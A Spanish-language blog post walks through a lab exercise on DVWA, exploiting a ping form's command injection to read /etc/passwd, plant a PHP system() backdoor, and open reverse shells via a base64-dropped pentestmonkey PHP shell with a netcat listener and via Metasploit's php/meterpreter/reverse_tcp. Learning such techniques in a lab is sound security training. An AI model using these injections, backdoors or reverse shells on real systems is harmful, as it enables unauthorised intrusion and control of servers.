---
title: Reverse Shell mediante Command Injection
layout: post
author: Patrick Campillo
excerpt_separator: <!--more-->
typora-copy-images-to: ../assets/img/cinjection_rshell/
typora-root-url: ../../
---

## Command Injection de forma directa

En esta práctica vamos a ver como aprovechar una vulnerabilidad de `Command Injection` para realizar diferentes acciones sobre el servidor web objetivo. Utilizaremos como objetivo una máquina `dvwa`, la cual nos permite realizar diferentes pruebas, con distintos niveles de seguridad, para practicar los diferentes tipos de ataques.



En el apartado `Command Injection`, nos permite realizar `ping` a una dirección que introduzcamos. Al no poseer seguridad, si detrás de la `IP`, introducimos un punto y coma, dos `&`, o en algunos casos una tubería, podremos introducir comandos que nos devolverán la información en la respuesta. 



Por ejemplo, si realizamos un `ls -l` detrás de la dirección, quedando el campo de "IP address" así: `127.0.0.1 && ls -l`, nos listará los archivos en la respuesta.

![](/patrickcampillo/assets/img/cinjection_rshell/0.png)

<br>

O también, si realizamos un `cat /etc/passwd`, nos mostrará los usuarios del sistema.

![](/patrickcampillo/assets/img/cinjection_rshell/0-1.png)



## Reverse Shell

Aprovechando esta vulnerabilidad, también podemos realizar un terminal remoto, mediante el cual tengamos acceso al propio servidor web y podamos aprovechar más vulnerabilidades para conseguir el objetivo que deseemos.



Para este ataque, explicaré dos opciones, una utilizando **`Burp Suite`** y **`MetaSploit`**, y la segunda utilizando un codificador de **`Base64`** y **`Netcat`**.



## Netcat y Base64

Para esta forma, necesitaremos descargarnos o copiar el contenido del siguiente [archivo](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) y guardarlo con el nombre que deseemos. Una vez guardado, tendremos que modificar el campo `$ip` y `$port`, que indican por qué puerto y dirección se establecerá la conexión remota.

```php
$ip = '192.168.1.46';  # CHANGE THIS
$port = 1234;       # CHANGE THIS
```

<br>

Una vez modificado, tendremos que dirigirnos a alguna página web de codificación en **`Base64`** y copiar el resultado. Ahora, en la web objetivo introduciremos la `IP`, seguida de un `echo` con el código en **`Base64`** copiado y lo almacenaremos en un archivo ".txt"

```php
 127.0.0.1 ; echo "pega-aquí-el-código-en-base64" > shell.txt
```

<br>

Y comprobaremos que se ha generado el fichero en el servidor, realizando un `ls -l`.

![](/patrickcampillo/assets/img/cinjection_rshell/1.png)

<br>

Seguidamente, volveremos a introducir una dirección `IP`, seguida de un `cat` del fichero generado, y utilizando una tubería para almacenar el texto decodificado en un nuevo fichero ".php".

```php
127.0.0.1 ; cat shell.txt | base64 -d > shell.php
```



Y volveremos a comprobar que todo ha salido correctamente.

![](/patrickcampillo/assets/img/cinjection_rshell/2.png)

<br>

Una vez todo está listo, ya solo deberemos ejecutar **`netcat`** , de la siguiente forma:

```php
nc -v -n -l -p 1234
```

 

Y realizar una búsqueda de la `URL` en la cual nos encontramos, pero eliminando la almohadilla y añadiendo el nombre de nuestro fichero. Esa búsqueda se quedará en espera, y si nos fijamos en nuestro terminal, la conexión se habrá establecido. Pudiendo observar todo lo que deseemos, pero sabiendo que nuestro usuario es `www-data` y puede que no tengamos algunos permisos.

![](/patrickcampillo/assets/img/cinjection_rshell/3.png)



![](/patrickcampillo/assets/img/cinjection_rshell/4.png)





## Burp Suite y MetaSploit



### Introducción a Burp Suite

Para comenzar a explicar cómo podemos realizar un ataque de Reverse Shell mediante **`Burp Suite`**, introduciré un poco el funcionamiento básico del mismo.



Primero, al iniciar **`Burp Suite`**, nos tendremos que dirigir al menú `Proxy`, habilitar la intercepción del tráfico, haciendo click sobre el botón `Intercept is off` y seguidamente sobre `Open Browser`.

![](/patrickcampillo/assets/img/cinjection_rshell/1-1621005581202.png)

<br>

En el navegador `Chromium` que se abre, introduciremos la dirección de la página objetivo. En este caso, es la `IP` del `Docker` que contiene la aplicación para practicar vulnerabilidades `dvwa`. Y introduciremos una dirección a la que se realizará un "ping".

![](/patrickcampillo/assets/img/cinjection_rshell/2-1621005821841.png)



![](/patrickcampillo/assets/img/cinjection_rshell/3-1621005851075.png)

<br>

En este momento, volveremos a **`Burp Suite`**, y deberemos acceder a `HTTP History` del menú `Proxy`. Aquí podremos ver el contenido de la petición que se ha realizado al servidor, observando la `IP` introducida.

![](/patrickcampillo/assets/img/cinjection_rshell/4-1621005998473.png)

![](/patrickcampillo/assets/img/cinjection_rshell/4-1.png)

<br>

Y habremos de enviar esta petición a la sección `Repeater`. Podemos hacerlo haciendo click derecho sobre la propia petición, o si la tenemos seleccionada utilizando el atajo `Ctrl+R`.

![](/patrickcampillo/assets/img/cinjection_rshell/4-2.png)

<br>

Una vez enviada nos dirigimos a este menú, y volvemos a enviar la petición. Nos mostrará la respuesta, y,  para agilizar el proceso, podemos buscar donde se encuentra la respuesta a la petición del "ping". 

![](/patrickcampillo/assets/img/cinjection_rshell/5-0.png)

![](/patrickcampillo/assets/img/cinjection_rshell/5.png)

<br>

Entonces, para que nos muestre directamente este apartado de la respuesta, para cada petición,  introduciremos la cadena `<pre>` en la barra de búsqueda que se encuentra en la parte inferior de la respuesta, seleccionaremos la llave de ajuste y habilitaremos la opción "Auto-scroll to match when the text change".

![](/patrickcampillo/assets/img/cinjection_rshell/5-1.png)



### Command Injection en Burp Suite

Una vez ya hemos realizado los pasos principales para comenzar con el `Command Injection`, podremos añadir en el campo `ip=` de la petición, la dirección que deseemos y seguidamente la orden que queremos que realice. Pudiendo observar la respuesta de la orden dentro de la cadena `<pre>`.

![](/patrickcampillo/assets/img/cinjection_rshell/5-2.png)

![](/patrickcampillo/assets/img/cinjection_rshell/5-3.png)

<br>

![5-4](/patrickcampillo/assets/img/cinjection_rshell/5-4.png)

![](/patrickcampillo/assets/img/cinjection_rshell/5-5.png)

<br>

Aprovechándonos de esta vulnerabilidad, podemos aprovechar para crear un fichero, que llamaremos `backdoor.php`, en el que insertaremos la función `system()` de **PHP**, mediante la cual, le indicaremos qué comando deberá realizar utilizando `$_GET['c']`. Con esto, crearemos una página dentro del directorio "exec", en la cual indicándole el valor de `c` en la `URL`, nos devolverá la respuesta en el navegador. 

![](/patrickcampillo/assets/img/cinjection_rshell/5-6.png)

[^]: Se debe introducir el símbolo "\", ya que sino el "$" lo elimina

<br>

Y una vez creado el fichero podremos acceder a él a través del navegador, y podremos indicarle que comando deseamos que se ejecute. Por ejemplo, si queremos visualizar el fichero que contiene la información de los usuarios, solo deberemos introducir `c=cat /etc/passwd `(en las imágenes se visualiza un `%20` que representa el espacio).![](/patrickcampillo/assets/img/cinjection_rshell/6.png)

<br>

O si deseamos ver, también, el fichero que almacena los nombres del host y los conocidos, introduciremos `c=cat /etc/hosts`.

![](/patrickcampillo/assets/img/cinjection_rshell/6-1.png)



### MetaSploit

Aprovechándonos de la página creada, podremos realizar un `Reverse Shell` utilizando algunas características que nos proporciona **`MetaSploit`**.



Comenzaremos utilizando el exploit `exploit/multi/script/web_delivery`, y mostraremos los objetivos a explotar.

![](/patrickcampillo/assets/img/cinjection_rshell/7.png)

![](/patrickcampillo/assets/img/cinjection_rshell/7-1.png)

<br>

Observando los posibles objetivos, sabemos que podemos aprovechar **PHP**. Entonces pasamos a establecerlo como objetivo, indicando su **ID**. Indicaremos el `payload`, que será `php/meterpreter/reverse_tcp`. Y también, le indicaremos la dirección IP y el puerto de escucha del host, es decir, del propio equipo.

![](/patrickcampillo/assets/img/cinjection_rshell/7-2.png)

<br>

Una vez hemos indicado todos estos parámetros, que son los básicos, podremos indicarle con el comando `run`, que ejecute el ataque. Y, nos devolverá el comando a introducir en shell del objetivo, en este caso, lo introduciremos en el fichero que hemos creado antes utilizando **`Burp Suite`**.

![](/patrickcampillo/assets/img/cinjection_rshell/7-3.png)

![](/patrickcampillo/assets/img/cinjection_rshell/8-0.png)

<br>

Y conseguiremos que se abra una sesión remota en el equipo objetivo. Si queremos acceder a esta sesión utilizaremos el comando `sessions -i 1`(ya que solo tenemos una), y se ejecutará el `reverse shell`, pemitiéndonos realizar cualquier acción para la que poseamos permisos ya que somos el usuario `www-data`.

![](/patrickcampillo/assets/img/cinjection_rshell/8.png)

![](/patrickcampillo/assets/img/cinjection_rshell/8-1.png)

![](/patrickcampillo/assets/img/cinjection_rshell/8-2.png)





## EXTRA

Por último, me gustaría comentar que este ejercicio se ha realizado en el nivel de seguridad bajo de `dvwa`. Pero si desearamos realizarlo en nivel medio, también podríamos, pero sustituyendo el `;` por `|`.

![](/patrickcampillo/assets/img/cinjection_rshell/9.png)

<br>

Y podríamos realizar los mismos pasos para conseguir realizar el `reverse shell` mediante `command injection`.